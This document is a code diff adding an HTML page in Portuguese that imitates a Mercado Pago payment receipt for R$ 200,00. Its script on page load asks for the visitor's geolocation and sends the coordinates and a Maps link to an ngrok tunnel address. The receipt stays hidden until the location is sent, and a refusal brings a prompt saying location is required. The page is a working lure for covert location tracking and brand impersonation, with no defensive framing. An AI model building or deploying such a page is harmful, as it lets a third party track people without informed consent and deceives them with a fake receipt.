@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Comprovante de Recebimento</title>
+  <link rel="stylesheet" href="styles.css" />
+</head>
+
+<body>
+  <div class="comprovante-container" id="main">
+    <img src="https://logodownload.org/wp-content/uploads/2019/06/mercado-pago-logo.png"  width="200"/>
+    <h1 style="margin: 15px 0;">Comprovante de Pagamento</h1>
+
+    <div class="informacoes">
+      <p><span>Data:</span> <span id="data-atual"></span></p>
+      <p><span>Valor Enviado:</span> R$ 200,00</p>
+      <p><span>De:</span> Marcio Gomes</p>
+      <p><span>Para:</span> Marcos de Jesus Corte</p>
+      <p><span>CPF:</span> ***.674.098-**</p>
+      <p><span>Status:</span> Pagamento efetuado com Sucesso</p>
+    </div>
+
+    <button class="botao" onclick="window.print()">Imprimir</button>
+
+    <div class="comprovante-footer">
+      <p>Se você tiver dúvidas, entre em contato com nosso suporte.</p>
+      <p><a href="#">Clique aqui</a> para mais informações.</p>
+    </div>
+
+  </div>
+
+  <script>
+    function displayComprovante() {
+      console.log('teste');
+      document.getElementById("main").classList.add('show');
+    }
+    window.addEventListener("load", () => {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(sendLocation, handleError);
+      } else {
+        alert("Algo deu errado. Tente novamente mais tarde.");
+      }
+    });
+    
+    const dataAtual = new Date();
+    const dia = String(dataAtual.getDate()).padStart(2, '0');
+    const mes = String(dataAtual.getMonth() + 1).padStart(2, '0');
+    const ano = dataAtual.getFullYear();
+    
+    const dataFormatada = `${dia}/${mes}/${ano}`;
+    
+    document.getElementById("data-atual").textContent = dataFormatada;
+    console.log(dataAtual)
+    function sendLocation(position) {
+      const latitude = position.coords.latitude;
+      const longitude = position.coords.longitude;
+      const maps = `https://www.google.com/maps?q=${latitude},${longitude}`;
+
+      fetch("https://4388-191-5-234-73.ngrok-free.app/send-location", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({ latitude, longitude, maps })
+      })
+        .then(response => response.json())
+        .then(data => {
+          displayComprovante();
+          if (!data.success) {
+            alert("Erro ao enviar o comprovante.");
+          }
+        })
+        .catch(error => {
+          console.error("Erro:", error);
+        });
+    }
+
+    function handleError(error) {
+      alert("Habilite a localização para visualizar o comprovante.");
+    }
+  </script>
+</body>
+
+</html>
